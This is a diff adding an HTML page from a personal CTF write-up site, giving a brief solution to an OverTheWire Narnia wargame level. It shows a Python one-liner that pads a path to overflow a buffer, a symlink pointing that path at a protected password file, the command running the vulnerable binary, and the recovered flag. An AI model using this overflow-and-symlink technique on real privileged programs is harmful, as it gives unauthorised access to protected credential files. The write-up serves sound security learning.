@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/CTF_writeups/assets/css/style.css?v=6aacf4c090fc5e966ec687925a0bf39a46c3a14c">
+    <link rel="shortcut icon" type="image/x-icon" href="/CTF_writeups/favicon.ico">
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>narnia4 | Avishai’s CTF Writeups</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="narnia4" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="…" />
+<meta property="og:description" content="…" />
+<link rel="canonical" href="http://localhost:4000/CTF_writeups/overthewire/narnia/narnia4.html" />
+<meta property="og:url" content="http://localhost:4000/CTF_writeups/overthewire/narnia/narnia4.html" />
+<meta property="og:site_name" content="Avishai’s CTF Writeups" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="narnia4" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"…","headline":"narnia4","url":"http://localhost:4000/CTF_writeups/overthewire/narnia/narnia4.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/CTF_writeups/">
+          <h1>Avishai's CTF Writeups</h1>
+        </a>
+        <h2>...</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/avishaigonen123/CTF_writeups" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <p>we will override the output file, this is the line we’ll run
+<code class="language-plaintext highlighter-rouge">python3 -c "print('/tmp/1/'+'a'*(32-len('/tmp/1/')) + 'output_file')"</code>
+notice my dir is <code class="language-plaintext highlighter-rouge">/tmp/1</code>.
+then, we will run link the file that it outputs to the password file: <code class="language-plaintext highlighter-rouge">ln -sf /etc/narnia_pass/narnia4 /tmp/1/aaaaaaaaaaaaaaaaaaaaaaaaaoutput_file</code></p>
+
+<p>then, we will create the output file: <code class="language-plaintext highlighter-rouge">touch output_file</code>
+and we need only to execute the binary: <code class="language-plaintext highlighter-rouge">/narnia/narnia3 /tmp/1/aaaaaaaaaaaaaaaaaaaaaaaaaoutput_file</code></p>
+
+<p>in one picture:
+<img src="/CTF_writeups/overthewire/narnia/images/level4.png" alt="alt text" /></p>
+
+<p><strong>Flag:</strong> <strong><em><code class="language-plaintext highlighter-rouge">iqNWNk173q</code></em></strong></p>
+
+      </section>
+    </div>
+  </body>
+</html>
